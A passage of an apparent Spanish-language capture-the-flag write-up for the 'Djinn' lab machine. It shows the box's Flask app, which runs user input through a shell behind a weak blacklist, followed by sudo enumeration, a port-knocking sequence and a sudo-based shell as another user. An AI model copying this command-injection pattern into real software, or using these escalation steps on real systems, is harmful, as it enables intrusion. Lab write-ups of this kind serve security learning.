&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;subprocess&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flask&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;url_for&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;secret_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CREDS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/home/nitish/.dev/creds.txt&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;RCE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;^&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;eval&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CREDS&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cat&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RCE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;


&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;main.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/wish&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;wish&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;execute&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;subprocess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Popen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                                      &lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subprocess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PIPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Wrong choice of words&amp;#34;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;genie&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wish.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/genie&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;genie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;page&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;page&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;It&amp;#39;s not that hard&amp;#34;&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;genie.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la contraseña con el usuario y logramos obtener una shell con el usuario &lt;code&gt;nitish&lt;/code&gt; y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_112720.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;genie&lt;/code&gt; esto con el usuario sam sin contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nitish@djinn:~$ sudo -l -l
sudo -l -l
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; nitish on djinn:
    env_reset, mail_badpass,
    &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/snap/bin

User nitish may run the following commands on djinn:

Sudoers entry:
    RunAsUsers: sam
    Options: !authenticate
    Commands:
	/usr/bin/genie
nitish@djinn:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Otro de los hallazgos que hicimos es un archivo de configuracion de &lt;code&gt;knock&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nitish@djinn:/etc$ cat knockd.conf
cat knockd.conf
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;options&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
	UseSyslog

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;openSSH&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;sequence&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 1356, 6784, &lt;span class=&#34;m&#34;&gt;3409&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;seq_timeout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
	&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;     &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /sbin/iptables -I INPUT &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -s %IP% -p tcp --dport &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -j ACCEPT
	&lt;span class=&#34;nv&#34;&gt;tcpflags&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; syn

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;closeSSH&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;sequence&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 3409, 6784, &lt;span class=&#34;m&#34;&gt;1356&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;seq_timeout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
	&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;     &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /sbin/iptables -D INPUT -s %IP% -p tcp --dport &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -j ACCEPT
	&lt;span class=&#34;nv&#34;&gt;tcpflags&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; syn
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la secuencia para obtener una shell en SSH.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_114834.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora si, seguimos investigando sobre &lt;code&gt;/usr/bin/genie&lt;/code&gt;, le pasamos los parametros que pide este ejecutable, esperando a que ejecute nuestro comando, pero al parecer no se agrega en ningun tipo de cron o proceso&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nitish@djinn:/etc$ /usr/bin/genie -p bash -g -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;ping -c 5 10.2.29.162&amp;#34;&lt;/span&gt; wish
/usr/bin/genie -p bash -g -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;ping -c 5 10.2.29.162&amp;#34;&lt;/span&gt; wish
We&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;ve added your wish to our records.
Continue praying!!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la documentacion de este ejecutable encontramos un parametro que no aparece en el ejecutable al mostrar la ayuda (&lt;code&gt;-h&lt;/code&gt;), agregamos este parametro junto al usuario &lt;code&gt;sam&lt;/code&gt;. Logramos obtener una shell con este ultimo usuario. Hicimos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;lago&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd gg
my man!!
$ whoami
sam
$ sudo -l -l 
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; sam on djinn:
    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/snap/bin

User sam may run the following commands on djinn:

Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
	/root/lago
$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos este comando y nos muestra diferentes opciones pero ninguna de estas nos deja escalar privilegios. En la carpeta de este usuario encontramos un archivo &lt;code&gt;.pyc&lt;/code&gt; el cual al leer las strings encontramos las mismas que el comando &lt;code&gt;lago&lt;/code&gt; muestra.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
